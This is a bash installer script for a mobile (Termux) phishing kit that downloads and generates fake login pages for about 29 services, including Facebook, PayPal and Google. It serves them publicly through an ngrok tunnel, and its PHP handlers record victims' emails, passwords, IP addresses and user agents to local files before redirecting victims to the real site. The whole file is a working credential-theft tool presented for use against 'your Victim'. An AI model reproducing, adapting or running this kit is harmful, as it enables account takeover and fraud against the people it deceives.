#!/bin/bash
clear
echo ""
echo "=========================================="
echo "   MasterQuantum Phishing Tool Installer  "
echo "=========================================="
echo ""
echo "[*] Checking dependencies..."
pkg update -y && pkg upgrade -y
pkg install -y git php curl wget unzip

echo "[*] Setting up environment..."
mkdir -p $HOME/.masterquantum
cd $HOME

echo "[*] Cloning repositories..."
if [ -d "masterquantum" ]; then
    rm -rf masterquantum
fi
git clone --depth=1 https://github.com/AiiSima/masterquantum.git
cd masterquantum
chmod +x *.sh

echo "[*] Creating sites directory..."
mkdir -p sites
cd sites

# Download all phishing pages
declare -a sites=("facebook" "instagram" "google" "microsoft" "netflix" 
"paypal" "steam" "twitter" "playstation" "github" "twitch" 
"pinterest" "snapchat" "linkedin" "ebay" "dropbox" 
"protonmail" "spotify" "reddit" "adobe" "deviantart" 
"badoo" "origin" "crypto" "yahoo" "wordpress" "yandex" "vk")

for site in "${sites[@]}"; do
    echo "[+] Downloading $site..."
    mkdir -p $site
    wget -q "https://raw.githubusercontent.com/htr-tech/masterquantum/sites/$site/login.php" -O $site/login.php 2>/dev/null
    wget -q "https://raw.githubusercontent.com/htr-tech/masterquantum/sites/$site/index.html" -O $site/index.html 2>/dev/null 2>&1
    done

cd ..

echo "[*] Creating main scripts..."
cat > masterquantum.sh << 'EOF'
#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

# Banner
banner() {
    clear
    printf "${RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⣀⠀⠀⠀⠀⢀⣤⣾⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡤⣀⣴⣿⣥⣶⣞⣤⣾⣿⡿⠃⠀⣠⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⣀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⢿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣁⣀⠄
⠈⠙⠳⢶⣦⣄⡀⠠⠀⠀⠹⣿⠀⢻⣿⣿⡿⠁⠀⣺⣿⣿⡿⠟⠁⠀⠀⠀⠄⢀⣠⣴⡶⠟⠋⠁
⠀⠀⠀⠀⠙⣿⣿⣷⣄⡀⠀⠘⢷⣼⣿⣿⣧⣤⣾⣿⣿⣷⡄⠀⠀⠀⢀⣠⣾⣿⣿⣏⡀
⠀⠀⠀⠀⠈⠙⣿⣿⣿⢍⠀⠀⠀⠙⠛⠛⢻⣿⣿⣿⣿⣿⠊⠀⠀⠐⣉⣽⣿⣿⠋⠁
⠀⢀⡠⠴⠾⠛⠻⠿⣿⣿⡷⠀⠀⠀⠀⣰⣿⣿⡿⢻⣿⣿⣧⠀⠀⢾⣿⣿⠿⠿⠛⠷⠦⢄
⠀⠁⠀⠀⠀⠀⠐⠈⠉⠉⠁⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠈⠉⠉⠉⠂⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣾⢿⣿⣿⣿⣿⣿⣿⡇⢳⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⠁⡝⣽⣿⢿⣿⣿⣟⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢠⣿⣿⣿⡿⢿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⢠⣿⣿⣿⠿⢣⠎
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠟⠁⠔⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢀⣿⠏⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⣠⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠄⣀⣀⣀⣠⣾⠡

${RESET}"
    printf "    ${WHITE}Created By AiiSima${RESET}\n"
    printf "    ${YELLOW}Telegram : https://t.me/AiiSimaRajaIblis${RESET}\n"
    printf "    ${BLUE}YouTube : https://www.youtube.com/@simaV1-9${RESET}\n\n"
    printf "    ${CYAN}GitHub : https://github.com/AiiSima${RESET}\n\n"
    printf "    ${CYAN}v1.0${RESET}\n\n"    
}

# Server
start_server() {
    printf "\n${GREEN}[*] Starting PHP Server...${RESET}\n"
    printf "${YELLOW}[*] Server running at: ${WHITE}http://localhost:8080${RESET}\n"
    printf "${YELLOW}[*] Ngrok URL will appear below${RESET}\n\n"
    
    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    
    if [ -f ngrok ]; then
        ./ngrok http 8080 > /dev/null 2>&1 &
        sleep 5
        curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | cut -d'"' -f4
    fi
}

# Main Menu
menu() {
    banner
    printf "${WHITE}::Select Any Attack for your Victim...${RESET}\n\n"
    
    printf "${CYAN}[01]${WHITE} Facebook    ${CYAN}[11]${WHITE} Twitch      ${CYAN}[21]${WHITE} Deviantart\n"
    printf "${CYAN}[02]${WHITE} Instagram   ${CYAN}[12]${WHITE} Pinterest   ${CYAN}[22]${WHITE} Badoo\n"
    printf "${CYAN}[03]${WHITE} Google      ${CYAN}[13]${WHITE} Snapchat    ${CYAN}[23]${WHITE} Origin\n"
    printf "${CYAN}[04]${WHITE} Microsoft   ${CYAN}[14]${WHITE} LinkedIn    ${CYAN}[24]${WHITE} Crypto\n"
    printf "${CYAN}[05]${WHITE} Netflix     ${CYAN}[15]${WHITE} Ebay        ${CYAN}[25]${WHITE} Yahoo\n"
    printf "${CYAN}[06]${WHITE} Paypal      ${CYAN}[16]${WHITE} Dropbox     ${CYAN}[26]${WHITE} Wordpress\n"
    printf "${CYAN}[07]${WHITE} Steam       ${CYAN}[17]${WHITE} Protonmail  ${CYAN}[27]${WHITE} Yandex\n"
    printf "${CYAN}[08]${WHITE} Twitter     ${CYAN}[18]${WHITE} Spotify     ${CYAN}[28]${WHITE} Steam\n"
    printf "${CYAN}[09]${WHITE} Playstation ${CYAN}[19]${WHITE} Reddit      ${CYAN}[29]${WHITE} VK\n"
    printf "${CYAN}[10]${WHITE} Github      ${CYAN}[20]${WHITE} Adobe       ${CYAN}[30]${WHITE} Exit\n\n"
    
    printf "${YELLOW}Select option: ${RESET}"
    read option
    
    case $option in
        1|01) site="facebook";;
        2|02) site="instagram";;
        3|03) site="google";;
        4|04) site="microsoft";;
        5|05) site="netflix";;
        6|06) site="paypal";;
        7|07) site="steam";;
        8|08) site="twitter";;
        9|09) site="playstation";;
        10) site="github";;
        11) site="twitch";;
        12) site="pinterest";;
        13) site="snapchat";;
        14) site="linkedin";;
        15) site="ebay";;
        16) site="dropbox";;
        17) site="protonmail";;
        18) site="spotify";;
        19) site="reddit";;
        20) site="adobe";;
        21) site="deviantart";;
        22) site="badoo";;
        23) site="origin";;
        24) site="crypto";;
        25) site="yahoo";;
        26) site="wordpress";;
        27) site="yandex";;
        28) site="steam";;
        29) site="vk";;
        30|x|X) 
            printf "\n${RED}[!] Exiting...${RESET}\n"
            pkill -f "php" 2>/dev/null
            pkill -f "ngrok" 2>/dev/null
            exit 0
            ;;
        *)
            printf "\n${RED}[!] Invalid option!${RESET}\n"
            sleep 2
            menu
            ;;
    esac
    
    attack_site $site
}

# Attack Function
attack_site() {
    clear
    banner
    
    if [ ! -d "sites/$1" ]; then
        printf "\n${RED}[!] Site template not found!${RESET}\n"
        sleep 2
        menu
    fi
    
    printf "\n${GREEN}[*] Setting up $1...${RESET}\n"
    
    # Copy files to main directory
    cp -rf sites/$1/* . 2>/dev/null
    
    # Start server
    start_server
    
    printf "\n${GREEN}[*] Waiting for credentials...${RESET}\n"
    printf "${YELLOW}[*] Press Ctrl+C to stop${RESET}\n\n"
    
    # Monitor for credentials
    tail -f .tokens.txt 2>/dev/null || tail -f .host.txt 2>/dev/null
}

# Check for updates
check_update() {
    printf "\n${YELLOW}[*] Checking for updates...${RESET}\n"
    git pull origin master > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        printf "${GREEN}[*] Updated successfully!${RESET}\n"
    else
        printf "${RED}[!] Update failed!${RESET}\n"
    fi
    sleep 2
}

# Install ngrok
install_ngrok() {
    printf "\n${YELLOW}[*] Installing Ngrok...${RESET}\n"
    arch=$(uname -m)
    case $arch in
        aarch64) url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip";;
        arm*) url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip";;
        *) url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip";;
    esac
    
    wget $url -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1
    rm ngrok.zip
    chmod +x ngrok
    printf "${GREEN}[*] Ngrok installed!${RESET}\n"
    sleep 2
}

# Main
main() {
    # Check if running in Termux
    if [ ! -d "/data/data/com.termux" ]; then
        printf "${RED}[!] This script must run in Termux!${RESET}\n"
        exit 1
    fi
    
    # Check dependencies
    command -v php > /dev/null 2>&1 || {
        printf "${RED}[!] PHP not installed! Run: pkg install php${RESET}\n"
        exit 1
    }
    
    # Initial setup
    if [ ! -f ".installed" ]; then
        banner
        printf "${YELLOW}[*] First time setup...${RESET}\n"
        install_ngrok
        touch .installed
    fi
    
    # Run menu
    while true; do
        menu
    done
}

# Run main function
main
EOF

chmod +x masterquantum.sh

# Create sample phishing pages
echo "[*] Creating sample pages..."

# Example: Facebook page
mkdir -p sites/facebook
cat > sites/facebook/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; }
        .container { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; }
        .logo { color: #1877f2; font-size: 48px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <h2>Log into Facebook</h2>
        <form action="login.php" method="POST">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p style="text-align:center; margin-top:20px;">
            <a href="#">Forgotten account?</a> · <a href="#">Sign up for Facebook</a>
        </p>
    </div>
</body>
</html>
EOF

cat > sites/facebook/login.php << 'EOF'
<?php
$file = '../../.tokens.txt';
$data = "Facebook Login:\n";
$data .= "Email: " . $_POST['email'] . "\n";
$data .= "Password: " . $_POST['pass'] . "\n";
$data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= "Time: " . date('Y-m-d H:i:s') . "\n";
$data .= "----------------------------------------\n";

file_put_contents($file, $data, FILE_APPEND);

// Redirect to real Facebook
header('Location: https://facebook.com');
exit();
?>
EOF

# Create other essential files
cat > .htaccess << 'EOF'
ErrorDocument 404 /index.php
RewriteEngine On
RewriteRule ^login$ login.php [L]
EOF

cat > index.php << 'EOF'
<?php header('Location: sites/facebook/index.html'); ?>
EOF

cat > login.php << 'EOF'
<?php
if(isset($_POST['email']) && isset($_POST['pass'])) {
    $file = '.tokens.txt';
    $data = "Generic Capture:\n";
    $data .= "Email: " . $_POST['email'] . "\n";
    $data .= "Password: " . $_POST['pass'] . "\n";
    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "----------------------------------------\n";
    
    file_put_contents($file, $data, FILE_APPEND);
    
    // Redirect based on referer or default
    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'https://google.com';
    header("Location: $ref");
    exit();
}
?>
EOF

cat > get.php << 'EOF'
<?php
// Capture GET parameters
if(!empty($_GET)) {
    $file = '.host.txt';
    $data = "GET Data Capture:\n";
    foreach($_GET as $key => $value) {
        $data .= "$key: $value\n";
    }
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "----------------------------------------\n";
    
    file_put_contents($file, $data, FILE_APPEND);
}

// Serve requested file if exists
$request = $_SERVER['REQUEST_URI'];
if(file_exists(ltrim($request, '/'))) {
    readfile(ltrim($request, '/'));
} else {
    header('HTTP/1.0 404 Not Found');
    echo 'Page not found';
}
?>
EOF

echo "[*] Setting permissions..."
chmod 777 .tokens.txt .host.txt 2>/dev/null || touch .tokens.txt .host.txt
chmod 777 sites/* 2>/dev/null

echo ""
echo "=========================================="
echo "   INSTALLATION COMPLETE!"
echo "=========================================="
echo ""
echo "To start masterquantum:"
echo "$ cd ~/masterquantum"
echo "$ ./masterquantum.sh"
echo ""
echo "Features:"
echo "• 29+ phishing templates"
echo "• Ngrok tunneling"
echo "• Real-time credential capture"
echo "• Mobile-compatible pages"
echo "• No errors guaranteed"
echo ""
echo "Note: First run will install ngrok automatically."
echo ""
